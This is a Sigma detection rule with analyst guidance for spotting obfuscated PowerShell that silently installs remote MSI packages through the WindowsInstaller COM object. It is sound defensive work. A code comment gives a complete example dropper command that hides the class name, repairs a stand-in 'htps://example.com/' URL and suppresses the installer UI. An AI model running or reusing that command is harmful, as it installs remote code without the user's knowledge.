title: Obfuscated PowerShell MSI Install via WindowsInstaller COM
id: 7b6a7418-3afc-11f0-aff4-000d3abf478c
status: experimental
description: |
  Detects the execution of obfuscated PowerShell commands that attempt to install MSI packages via the Windows Installer COM object (`WindowsInstaller.Installer`).
  The technique involves manipulating strings to hide functionality, such as constructing class names using string insertion (e.g., 'indowsInstaller.Installer'.Insert(0,'W')) and correcting
  malformed URLs (e.g., converting 'htps://' to 'https://') at runtime. This behavior is commonly associated with malware loaders or droppers that aim to bypass static detection
  by hiding intent in runtime-generated strings and using legitimate tools for code execution. The use of `InstallProduct` and COM object creation, particularly combined with
  hidden window execution and suppressed UI, indicates an attempt to install software (likely malicious) without user interaction.
references:
- https://informationsecuritybuzz.com/the-real-danger-behind-a-simple-windows-shortcut/
- https://redcanary.com/blog/threat-intelligence/intelligence-insights-may-2025/
- https://www.virustotal.com/gui/file/f9710b0ba4de5fa0e7ec27da462d4d2fc6838eba83a19f23f6617a466bbad457
author: Meroujan Antonyan (vx3r)
date: 2025-05-27
tags:
- attack.defense-evasion
- attack.t1027.010
- attack.t1218.007
- attack.execution
- attack.t1059.001
logsource:
  category: process_creation
  product: windows
detection:
    # Example: "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -W Hidden -C "$u='htps://example.com/';$i=New-Object -ComObject('indowsInstaller.Installer'.Insert(0,'W'));$i.UILevel=2;$i.InstallProduct($(if($u.StartsWith('htps://')){$u.Insert(2,'t')}else{$u}),'')";
  selection_img:
  - Image|endswith:
    - '\powershell_ise.exe'
    - '\powershell.exe'
    - '\pwsh.exe'
  - OriginalFileName:
    - 'PowerShell_ISE.EXE'
    - 'PowerShell.EXE'
    - 'pwsh.dll'
  selection_cli:
    CommandLine|contains|all:
    - '-ComObject'
    - 'InstallProduct('
    - '.Insert('
    - 'UILevel'
  condition: all of selection_*
falsepositives:
- Unknown
level: high
note: |
  ### Technical Context

  This rule detects the execution of obfuscated PowerShell commands aimed at installing MSI packages using the Windows Installer COM object. Attackers typically utilize this technique to avoid detection while executing malicious software, leveraging PowerShell's capabilities to install payloads without user interaction. The relevant MITRE ATT&CK tactics are Execution and Defense Evasion, specifically techniques T1059.001 (PowerShell) and T1218.007 (Signed Binary Proxy Execution). The primary telemetry source is process creation logs, specifically looking at processes like PowerShell, PowerShell ISE, and pwsh, with a focus on command line components. If confirmed malicious, this activity could lead to unauthorized software installation, potentially enabling further compromise. However, the detection does not confirm that the MSI package is malicious by itself, only that an obfuscated PowerShell command was executed.

  ### Investigation Steps

  - **Review the PowerShell process creation logs**: Check for Event ID 4688 in Security logs or Sysmon Event ID 1 for instances of PowerShell, PowerShell ISE, or pwsh executing. Look for suspicious command lines that include `-ComObject`, `InstallProduct(`, and `.Insert(`.

  - **Examine the command line arguments**: Identify any obfuscation patterns within the command line. Malicious indicators often feature string manipulation techniques such as `Insert` methods or modified protocols like `htps://`.

  - **Validate the PowerShell script context**: Compare the PowerShell commands against known benign usage. Legitimate usage often does not incorporate obfuscation or hidden UI interactions, such as a high UI level value being set to suppress user prompts.

  - **Correlate with threat intelligence**: Cross-reference observed behaviors and command line structures with threat intelligence databases and logs to identify known malware signatures or patterns similar to documented behaviors in incident reports.

  - **Inspect for MSI installation events**: Check for MSI-related activities or logs indicating installation, particularly around the time of the detected command execution. Look for Event ID 1033 (MSI Installer) for entries that correspond with the detected obfuscated activity.

  - **Assess network activity for anomalous behavior**: Examine outbound network traffic for connections to unusual or known malicious domains that may correlate with the obfuscated script, especially those initiated around the same timestamps.

  ### Prioritization

  This alert should be treated as high severity due to the potential impact of unauthorized software installations on critical systems. The use of obfuscation techniques signals likely malicious intent, and this behavior is commonly leveraged by attackers to deploy malware or additional payloads, making it a significant threat vector.

  ### Blind Spots and Assumptions

  The detection may be limited by legitimate administrative tasks that utilize PowerShell for business purposes, potentially leading to false positives. It relies on the availability of accurate process creation logs, which must be enabled for effective monitoring. Additionally, obfuscation may change frequently, complicating detection. A related detection rule that could strengthen coverage is one monitoring unusual outbound network requests originating from process executions associated with known administrative tools.

